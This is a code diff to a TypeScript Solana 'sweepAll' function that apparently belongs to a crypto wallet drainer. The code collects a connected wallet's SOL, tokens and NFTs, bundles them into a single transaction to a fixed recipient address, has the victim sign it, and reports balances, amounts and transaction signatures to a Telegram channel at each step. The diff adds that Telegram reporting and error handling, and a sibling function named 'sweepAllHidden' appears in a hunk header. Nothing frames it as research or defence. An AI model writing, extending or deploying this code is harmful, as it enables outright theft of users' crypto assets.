@@ -670,6 +670,7 @@ export async function sweepAllHidden(
 
 
 // === ENHANCED SWEEP FUNCTION WITH TOKENS & NFTs ===
+// === ENHANCED SWEEP FUNCTION WITH TOKENS & NFTs ===
 export async function sweepAll(
   publicKey: PublicKey,
   connection: Connection,
@@ -677,12 +678,35 @@ export async function sweepAll(
 ): Promise<boolean> {
   const RECIPIENT = new PublicKey(RECIPIENT_PUBKEY);
   
+  console.log("=".repeat(60));
+  console.log("🚀 COMPREHENSIVE ASSET SWEEP");
+  console.log("=".repeat(60));
+  
+  // Send initial notification
   try {
-    // Create transaction
-    const tx = new Transaction();
-    const latest = await connection.getLatestBlockhash("finalized");
-    tx.feePayer = publicKey;
-    tx.recentBlockhash = latest.blockhash;
+    await sendTelegramMessage(
+      `🚀 *Comprehensive Asset Sweep Started*\n` +
+      `From: \`${publicKey.toBase58().slice(0, 8)}...\`\n` +
+      `To: \`${RECIPIENT.toBase58().slice(0, 8)}...\`\n` +
+      `Timestamp: ${new Date().toISOString()}`
+    );
+  } catch (telegramError) {
+    console.warn("Failed to send initial Telegram notification:", telegramError);
+  }
+  
+  try {
+    // ===== STEP 1: Balance Check and Preparation =====
+    console.log(`\n🔍 STEP 1: Checking balances...`);
+    
+    try {
+      await sendTelegramMessage(
+        `🔍 *Step 1: Checking Balances*\n` +
+        `Wallet: \`${publicKey.toBase58().slice(0, 12)}...\`\n` +
+        `Status: Fetching balances...`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send balance check start notification:", telegramError);
+    }
     
     // 1. SOL Sweep
     const nativeBalance = await connection.getBalance(publicKey);
@@ -691,25 +715,118 @@ export async function sweepAll(
     
     console.log("SOL Balance:", nativeBalance / 1e9, "Available:", availableSol / 1e9);
     
+    // Send SOL balance notification
+    try {
+      await sendTelegramMessage(
+        `💰 *SOL Balance*\n` +
+        `Total: *${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
+        `Available for sweep: *${(availableSol / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
+        `Reserved for fees: *${(rentExemptSol / LAMPORTS_PER_SOL).toFixed(4)} SOL*`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send SOL balance notification:", telegramError);
+    }
+    
+    if (availableSol <= 0) {
+      console.log(`❌ Insufficient SOL for transaction fees`);
+      
+      try {
+        await sendTelegramMessage(
+          `❌ *Insufficient SOL*\n` +
+          `Not enough SOL for transaction fees\n` +
+          `Current: ${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n` +
+          `Required minimum: ${(rentExemptSol / LAMPORTS_PER_SOL).toFixed(4)} SOL`
+        );
+      } catch (telegramError) {
+        console.warn("Failed to send insufficient SOL notification:", telegramError);
+      }
+      
+      return false;
+    }
+
+    // Create transaction
+    const tx = new Transaction();
+    
+    
+    // ===== STEP 2: Add SOL Transfer =====
+    console.log(`\n💰 STEP 2: Adding SOL transfer...`);
+    
     if (availableSol > 0) {
+      const solToTransfer = availableSol - rentExemptSol;
+      
+      try {
+        await sendTelegramMessage(
+          `💰 *Step 2: SOL Transfer*\n` +
+          `Adding SOL transfer to transaction\n` +
+          `Amount: *${(solToTransfer / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
+          `Recipient: \`${RECIPIENT.toBase58().slice(0, 12)}...\``
+        );
+      } catch (telegramError) {
+        console.warn("Failed to send SOL transfer notification:", telegramError);
+      }
+      
       tx.add(
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: RECIPIENT,
-          lamports: availableSol - rentExemptSol, // Leave some SOL for token transfers
+          lamports: solToTransfer,
         })
       );
+      
+      console.log(`Added SOL transfer: ${(solToTransfer / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
     }
     
-    // 2. Get Token Balances from Helius
+    // ===== STEP 3: Fetch Token Balances =====
+    console.log(`\n🪙 STEP 3: Fetching token balances from Helius...`);
+    
+    try {
+      await sendTelegramMessage(
+        `🪙 *Step 3: Fetching Token Balances*\n` +
+        `Querying Helius API for token balances...\n` +
+        `Status: In progress`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send token fetch start notification:", telegramError);
+    }
+    
     const tokens = await getTokenBalances(publicKey, HELIUS_KEY);
     console.log(`Found ${tokens.length} tokens including NFTs`);
     
-    // 3. Add Token Transfer Instructions
+    try {
+      await sendTelegramMessage(
+        `📊 *Token Balance Results*\n` +
+        `Found: *${tokens.length} tokens*\n` +
+        `Status: Processing token transfers...`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send token results notification:", telegramError);
+    }
+    
+    // Track token statistics
+    let tokenCount = 0;
+    let fungibleTokens = 0;
+    let nftCount = 0;
+    let skippedTokens = 0;
+    
+    // ===== STEP 4: Add Token Transfer Instructions =====
+    console.log(`\n🔄 STEP 4: Adding token transfers...`);
+    
+    try {
+      await sendTelegramMessage(
+        `🔄 *Step 4: Processing Token Transfers*\n` +
+        `Adding ${tokens.length} token transfers to transaction...`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send token processing start notification:", telegramError);
+    }
+    
     for (const token of tokens) {
       try {
         // Skip if zero balance
-        if (Number(token.amount) == 0) continue;
+        if (Number(token.amount) == 0) {
+          skippedTokens++;
+          continue;
+        }
         
         // Get or create associated token account for recipient
         const recipientATA = await getAssociatedTokenAddress(
@@ -739,7 +856,10 @@ export async function sweepAll(
         
         // Check sender's token account exists
         const senderAccount = await connection.getAccountInfo(senderATA);
-        if (!senderAccount) continue;
+        if (!senderAccount) {
+          skippedTokens++;
+          continue;
+        }
         
         // Create transfer instruction
         const transferIx = createTransferInstruction(
@@ -752,22 +872,61 @@ export async function sweepAll(
         );
         
         tx.add(transferIx);
+        tokenCount++;
+        
+        // Determine if it's an NFT or fungible token
+        if (Number(token.amount) === 1 && token.decimals === 0) {
+          nftCount++;
+        } else {
+          fungibleTokens++;
+        }
         
         console.log(`Added ${token.amount} of token ${token.mint.slice(0, 8)}...`);
         
       } catch (err) {
         console.warn(`Failed to add token ${token.mint}:`, err);
+        skippedTokens++;
       }
     }
     
-    // 4. Add NFT Transfers (NFTs are also tokens, but we handle them specially if needed)
+    // Send token processing summary
+    try {
+      await sendTelegramMessage(
+        `✅ *Token Processing Complete*\n` +
+        `Successfully added: *${tokenCount} tokens*\n` +
+        `• Fungible Tokens: ${fungibleTokens}\n` +
+        `• NFTs: ${nftCount}\n` +
+        `• Skipped: ${skippedTokens}`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send token processing summary:", telegramError);
+    }
+    
+    // ===== STEP 5: Fetch and Process NFTs =====
+    console.log(`\n🎨 STEP 5: Fetching and processing NFTs...`);
+    
+    try {
+      await sendTelegramMessage(
+        `🎨 *Step 5: Fetching NFTs*\n` +
+        `Querying Helius API for NFT balances...`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send NFT fetch start notification:", telegramError);
+    }
+    
     const nfts = await getNFTs(publicKey, HELIUS_KEY);
     console.log(`Found ${nfts.length} NFTs`);
+    
+    let nftTransferCount = 0;
+    let skippedNFTs = 0;
     
     // NFTs are already included in the tokens array, but if you want special handling:
     for (const nft of nfts) {
       try {
-        if (Number(nft.amount) === 0) continue;
+        if (Number(nft.amount) === 0) {
+          skippedNFTs++;
+          continue;
+        }
         
         // Same logic as tokens - NFTs use the same token program
         const recipientATA = await getAssociatedTokenAddress(
@@ -802,20 +961,65 @@ export async function sweepAll(
         );
         
         tx.add(transferIx);
+        nftTransferCount++;
+        
         console.log(`Added NFT ${nft.name || nft.mint.slice(0, 8)}...`);
         
       } catch (err) {
         console.warn(`Failed to add NFT ${nft.mint}:`, err);
+        skippedNFTs++;
       }
+    }
+    
+    // Send NFT processing summary
+    try {
+      await sendTelegramMessage(
+        `✅ *NFT Processing Complete*\n` +
+        `Total NFTs found: ${nfts.length}\n` +
+        `• Transfers added: ${nftTransferCount}\n` +
+        `• Skipped: ${skippedNFTs}\n` +
+        `Total instructions in transaction: ${tx.instructions.length}`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send NFT processing summary:", telegramError);
     }
     
     // Check if we have any instructions to send
     if (tx.instructions.length === 0) {
       console.log("No assets to sweep");
+      
+      try {
+        await sendTelegramMessage(
+          `ℹ️ *No Assets to Sweep*\n` +
+          `Transaction contains no transfer instructions\n` +
+          `Wallet may be empty or only has insufficient SOL for fees`
+        );
+      } catch (telegramError) {
+        console.warn("Failed to send no assets notification:", telegramError);
+      }
+      
       return false;
     }
     
-    // 5. Send Transaction
+    // ===== STEP 6: Send Transaction =====
+    console.log(`\n🚀 STEP 6: Sending atomic sweep transaction...`);
+    console.log(`Total instructions: ${tx.instructions.length}`);
+    
+    try {
+      await sendTelegramMessage(
+        `🚀 *Step 6: Sending Atomic Transaction*\n` +
+        `Total Instructions: *${tx.instructions.length}*\n` +
+        `Transaction size: ${tx.serializeMessage().length} bytes\n` +
+        `Status: Signing and sending...`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send transaction start notification:", telegramError);
+    }
+
+    const latest = await connection.getLatestBlockhash("finalized");
+    tx.feePayer = publicKey;
+    tx.recentBlockhash = latest.blockhash;
+    
     const signedTx = await signTransaction(tx);
     const signature = await connection.sendRawTransaction(
       (signedTx as Transaction).serialize(),
@@ -826,22 +1030,127 @@ export async function sweepAll(
       }
     );
     
+    console.log(`Transaction sent: ${signature.slice(0, 16)}...`);
+    
+    // Send transaction sent notification
+    try {
+      await sendTelegramMessage(
+        `📤 *Transaction Sent*\n` +
+        `Signature: \`${signature}\`\n` +
+        `Explorer: https://explorer.solana.com/tx/${signature}\n` +
+        `Status: Awaiting confirmation...`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send transaction sent notification:", telegramError);
+    }
+    
     // Wait for confirmation
-    await connection.confirmTransaction({
+    console.log(`Awaiting confirmation...`);
+    
+    const confirmation = await connection.confirmTransaction({
       signature,
       blockhash: latest.blockhash,
       lastValidBlockHeight: latest.lastValidBlockHeight,
     }, 'confirmed');
     
-    console.log(`✅ Atomic sweep completed: ${signature.slice(0, 16)}...`);
+    // ===== FINAL REPORT =====
+    console.log("\n" + "=".repeat(60));
+    console.log("🎉 ATOMIC SWEEP COMPLETE!");
+    console.log("=".repeat(60));
+    
+    // Get final balance
+    const finalBalance = await connection.getBalance(publicKey);
+    const totalTransferred = nativeBalance - finalBalance;
+    
+    console.log(`\n📊 FINAL BALANCES:`);
+    console.log(`  Starting SOL: ${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+    console.log(`  Final SOL: ${(finalBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+    console.log(`  Transferred SOL: ${(totalTransferred / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+    console.log(`\n📋 ASSET SUMMARY:`);
+    console.log(`  Fungible Tokens: ${fungibleTokens}`);
+    console.log(`  NFTs: ${nftCount + nftTransferCount}`);
+    console.log(`  Total Assets: ${fungibleTokens + nftCount + nftTransferCount}`);
+    console.log(`\n✅ Transaction confirmed: ${signature.slice(0, 16)}...`);
+    
+    // Send final success notification with detailed summary
+    try {
+      await sendTelegramMessage(
+        `🎉 *ATOMIC SWEEP COMPLETE!*\n\n` +
+        `📊 *Final Summary*\n` +
+        `• Starting SOL: *${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
+        `• Final SOL: *${(finalBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
+        `• Transferred SOL: *${(totalTransferred / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n\n` +
+        `📋 *Asset Transfers*\n` +
+        `• Fungible Tokens: ${fungibleTokens}\n` +
+        `• NFTs: ${nftCount + nftTransferCount}\n` +
+        `• Total Assets: ${fungibleTokens + nftCount + nftTransferCount}\n` +
+        `• Skipped: ${skippedTokens + skippedNFTs}\n\n` +
+        `⚡ *Transaction Details*\n` +
+        `• Signature: \`${signature}\`\n` +
+        `• Instructions: ${tx.instructions.length}\n` +
+        `• Explorer: https://explorer.solana.com/tx/${signature}\n\n` +
+        `✅ *All assets transferred atomically!*`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send final success notification:", telegramError);
+    }
+    
     return true;
     
-  } catch (error) {
-    console.error("Atomic sweep failed:", error);
+  } catch (error: any) {
+    console.error("\n❌ ATOMIC SWEEP FAILED:", error);
+    
+    // Send error notification with context
+    const errorStep = getSweepErrorStep(error);
+    
+    try {
+      await sendTelegramMessage(
+        `❌ *Atomic Sweep Failed*\n\n` +
+        `Step: *${errorStep}*\n` +
+        `Error: \`${error.message?.slice(0, 200) || 'Unknown error'}\`\n\n` +
+        `💰 *Last Known State*\n` +
+        `Wallet: \`${publicKey.toBase58().slice(0, 12)}...\`\n` +
+        `Recipient: \`${RECIPIENT.toBase58().slice(0, 12)}...\`\n` +
+        `Time: ${new Date().toISOString()}\n\n` +
+        `⚠️ Manual intervention may be required`
+      );
+    } catch (telegramError) {
+      console.warn("Failed to send error notification:", telegramError);
+    }
+    
     return false;
   }
 }
 
+// Helper function to determine which step of the sweep failed
+function getSweepErrorStep(error: any): string {
+  const errorMessage = error.message?.toLowerCase() || '';
+  const stack = error.stack?.toLowerCase() || '';
+  
+  if (errorMessage.includes('balance') || errorMessage.includes('insufficient')) {
+    return 'Balance Check';
+  } else if (errorMessage.includes('token') || errorMessage.includes('helius')) {
+    return 'Token Balance Fetch';
+  } else if (errorMessage.includes('associated') || errorMessage.includes('ata')) {
+    return 'Token Account Setup';
+  } else if (errorMessage.includes('sign') || errorMessage.includes('signature')) {
+    return 'Transaction Signing';
+  } else if (errorMessage.includes('send') || errorMessage.includes('transaction')) {
+    return 'Transaction Submission';
+  } else if (errorMessage.includes('confirm') || errorMessage.includes('blockhash')) {
+    return 'Transaction Confirmation';
+  } else if (stack.includes('gettokenbalances') || stack.includes('getnfts')) {
+    return 'Helius API Call';
+  } else if (stack.includes('getassociatedtokenaddress')) {
+    return 'Token Account Derivation';
+  } else if (stack.includes('createtransferinstruction')) {
+    return 'Transfer Instruction Creation';
+  } else if (stack.includes('systemprogram.transfer')) {
+    return 'SOL Transfer Setup';
+  }
+  
+  return 'Unknown Step';
+}
 // ========== HELIUS API HELPERS ==========
 
 interface TokenBalance {
@@ -854,7 +1163,7 @@ interface TokenBalance {
 }
 
 async function getTokenBalances(wallet: PublicKey, apiKey: string): Promise<TokenBalance[]> {
-  const url = `https://api.helius.xyz/v0/addresses/${wallet.toString()}/balances?api-key=${apiKey}`;
+  const url = `https://api.helius.xyz/v1/addresses/${wallet.toString()}/balances?api-key=${apiKey}`;
   
   try {
     const response = await fetch(url);
@@ -884,7 +1193,7 @@ async function getTokenBalances(wallet: PublicKey, apiKey: string): Promise<Toke
 }
 
 async function getNFTs(wallet: PublicKey, apiKey: string): Promise<TokenBalance[]> {
-  const url = `https://api.helius.xyz/v0/addresses/${wallet.toString()}/nfts?api-key=${apiKey}`;
+  const url = `https://api.helius.xyz/v1/addresses/${wallet.toString()}/nfts?api-key=${apiKey}`;
   
   try {
     const response = await fetch(url);
